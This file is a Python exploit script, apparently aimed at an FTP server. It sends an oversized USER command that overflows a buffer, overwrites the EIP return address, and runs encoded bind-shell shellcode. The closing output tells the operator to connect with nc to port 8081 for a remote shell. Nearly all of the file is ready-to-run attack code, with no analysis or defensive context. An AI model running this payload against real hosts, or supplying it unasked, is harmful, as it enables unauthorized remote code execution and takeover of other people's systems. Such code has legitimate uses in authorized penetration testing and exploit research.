import socket
import sys

#asking user for input, makig sure target IP and port are entered
if len (sys.argv)<3:
	print ("[!]You need to enter the Target IP and Port")
	print ("[=]Example: %s 192.168.10.10 21"%sys.argv[0])
	sys.exit()
else:
	target_ip=sys.argv[1]
	target_port=int(sys.argv[2])

#connecting to the target
try:
	print("[+]Please wait as connection is established::::::::")
	print("[+]Connection Established")

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(15)
	s.connect((target_ip, target_port))

	print("[+]Receiving the Banner:::::::::::::::::")
	print(s.recv(1024))

except Exception as error:
	print ("[!]Connection Failed")
	sys.exit()

#create payload that will be sent to the target
junk1="\x46"*230
eip="\x03\x37\x3F\x77"
nops="\x90"*16
junk2="\x43"*16

#buf is created as a bind shell.
buf =  ""
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xb3\xbe\x32\x17\x83\xee\xfc\xe2\xf4\x4f\x56"
buf += "\xb0\x17\xb3\xbe\x52\x9e\x56\x8f\xf2\x73\x38\xee\x02"
buf += "\x9c\xe1\xb2\xb9\x45\xa7\x35\x40\x3f\xbc\x09\x78\x31"
buf += "\x82\x41\x9e\x2b\xd2\xc2\x30\x3b\x93\x7f\xfd\x1a\xb2"
buf += "\x79\xd0\xe5\xe1\xe9\xb9\x45\xa3\x35\x78\x2b\x38\xf2"
buf += "\x23\x6f\x50\xf6\x33\xc6\xe2\x35\x6b\x37\xb2\x6d\xb9"
buf += "\x5e\xab\x5d\x08\x5e\x38\x8a\xb9\x16\x65\x8f\xcd\xbb"
buf += "\x72\x71\x3f\x16\x74\x86\xd2\x62\x45\xbd\x4f\xef\x88"
buf += "\xc3\x16\x62\x57\xe6\xb9\x4f\x97\xbf\xe1\x71\x38\xb2"
buf += "\x79\x9c\xeb\xa2\x33\xc4\x38\xba\xb9\x16\x63\x37\x76"
buf += "\x33\x97\xe5\x69\x76\xea\xe4\x63\xe8\x53\xe1\x6d\x4d"
buf += "\x38\xac\xd9\x9a\xee\xd6\x01\x25\xb3\xbe\x5a\x60\xc0"
buf += "\x8c\x6d\x43\xdb\xf2\x45\x31\xb4\x41\xe7\xaf\x23\xbf"
buf += "\x32\x17\x9a\x7a\x66\x47\xdb\x97\xb2\x7c\xb3\x41\xe7"
buf += "\x7d\xbb\xe7\x62\xf5\x4e\xfe\x62\x57\xe3\xd6\xd8\x18"
buf += "\x6c\x5e\xcd\xc2\x24\xd6\x30\x17\xac\x2f\xbb\xf1\xd9"
buf += "\xae\x64\x40\xdb\x7c\xe9\x20\xd4\x41\xe7\x40\xdb\x09"
buf += "\xdb\x2f\x4c\x41\xe7\x40\xdb\xca\xde\x2c\x52\x41\xe7"
buf += "\x40\x24\xd6\x47\x79\xfe\xdf\xcd\xc2\xdb\xdd\x5f\x73"
buf += "\xb3\x37\xd1\x40\xe4\xe9\x03\xe1\xd9\xac\x6b\x41\x51"
buf += "\x43\x54\xd0\xf7\x9a\x0e\x16\xb2\x33\x76\x33\xa3\x78"
buf += "\x32\x53\xe7\xee\x64\x41\xe5\xf8\x64\x59\xe5\xe8\x61"
buf += "\x41\xdb\xc7\xfe\x28\x35\x41\xe7\x9e\x53\xf0\x64\x51"
buf += "\x4c\x8e\x5a\x1f\x34\xa3\x52\xe8\x66\x05\xc2\xa2\x11"
buf += "\xe8\x5a\xb1\x26\x03\xaf\xe8\x66\x82\x34\x6b\xb9\x3e"
buf += "\xc9\xf7\xc6\xbb\x89\x50\xa0\xcc\x5d\x7d\xb3\xed\xcd"
buf += "\xc2"

#concatenate the payloads into one variable
username= junk1 + eip + nops + buf + junk2

#sending payload to the target
try:
	print("[+]Sending credentials::::::::::::::::")
	s.send("USER " + username + "\r\n")
	s.close()
except Exception as error:
	print("[!]Exploit Failed")
	sys.exit()

#Message showing successful connection.
print("[+]SUCCESS!!!")
print ("[+]Connect to port 8081 on your target machine to get a bind shell")
print ("[+]Example: nc %s 8081"%target_ip)